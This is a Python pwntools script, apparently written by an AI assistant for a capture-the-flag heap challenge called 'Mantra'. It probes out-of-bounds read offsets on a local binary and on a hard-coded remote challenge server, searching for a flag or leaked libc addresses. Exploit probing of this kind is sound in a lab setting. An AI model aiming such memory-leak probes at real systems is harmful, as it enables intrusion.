#!/usr/bin/env python3
"""
Author: AI Assistant
Purpose: Final comprehensive attempt at Mantra
Created: 2025-11-23
Updated: 2025-11-23
Assumptions: Try extreme offsets and remote testing
Expected: Find flag or exploitable primitive
Result: TBD
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = '154.57.164.75'
PORT = 30444

def test_extreme_offsets(remote_target=False):
    """Try very large/small offsets"""
    if remote_target:
        io = remote(HOST, PORT)
    else:
        io = process(['./glibc/ld-2.34.so', './mantra'])

    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'string: ', b'100')
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'tie? ', b'3')
    io.sendlineafter(b'glyphs): ', b'MARKER01')
    io.sendlineafter(b'glyphs): ', b'MARKER02')
    io.sendlineafter(b'glyphs): ', b'MARKER03')

    # Try very large positive offset
    test_offsets = [1000, 10000, 100000, 0x7fffffff, -100, -1000]

    for offset in test_offsets:
        try:
            io.sendlineafter(b'> ', b'4')
            io.sendlineafter(b'recite? ', str(offset).encode())
            io.recvuntil(b'speaks: [')
            data = io.recvuntil(b']', drop=True)

            if b'HTB{' in data or b'flag' in data or b'FLAG' in data:
                log.success(f"FOUND FLAG at offset {offset}: {data}")
                io.interactive()
                return

            if len(data) == 8:
                qword = u64(data)
                if qword != 0:
                    log.info(f"Offset {offset}: 0x{qword:016x}")
                    if (qword >> 40) == 0x7f:
                        log.success(f"Potential libc at offset {offset}!")

            break  # Only one read allowed
        except EOFError:
            log.error(f"Crashed at offset {offset}")
            break
        except:
            log.error(f"Error at offset {offset}")
            break

    io.close()

def test_remote_simple():
    """Just try reading various offsets on remote"""
    offsets_to_try = [
        101,  # top chunk size
        -1,   # our chunk size
        200,  # far past allocation
        500,  # very far
    ]

    for offset in offsets_to_try:
        log.info(f"\n{'='*60}")
        log.info(f"Testing offset {offset} on REMOTE")
        log.info(f"{'='*60}\n")

        try:
            io = remote(HOST, PORT)
            io.sendlineafter(b'> ', b'1')
            io.sendlineafter(b'string: ', b'100')
            io.sendlineafter(b'> ', b'2')
            io.sendlineafter(b'tie? ', b'3')
            io.sendlineafter(b'glyphs): ', b'TESTTEST')
            io.sendlineafter(b'glyphs): ', b'TESTTEST')
            io.sendlineafter(b'glyphs): ', b'TESTTEST')
            io.sendlineafter(b'> ', b'4')
            io.sendlineafter(b'recite? ', str(offset).encode())
            io.recvuntil(b'speaks: [')
            data = io.recvuntil(b']', drop=True)

            if len(data) == 8:
                qword = u64(data)
                log.success(f"Remote offset {offset}: 0x{qword:016x}")
            else:
                log.info(f"Remote offset {offset}: {data}")

            io.close()
        except Exception as e:
            log.error(f"Error at offset {offset}: {e}")

        break  # Only one read per connection

if __name__ == '__main__':
    log.info("Testing locally first...")
    #test_extreme_offsets(remote_target=False)

    log.info("\nTesting remote...")
    test_remote_simple()
